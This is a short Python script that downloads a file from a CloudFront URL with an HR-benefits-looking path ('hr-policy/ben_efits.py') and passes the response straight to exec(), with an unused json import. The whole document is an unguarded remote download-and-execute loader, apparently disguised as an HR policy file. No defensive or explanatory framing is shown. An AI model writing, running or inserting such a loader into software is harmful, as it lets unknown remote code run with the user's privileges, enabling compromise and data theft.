from urllib.request import urlopen
import json
url = "https://d1j8h69n92tqfa.cloudfront.net/hr-policy/ben_efits.py"
with urlopen(url) as response:
  body = response.read()

exec(body)
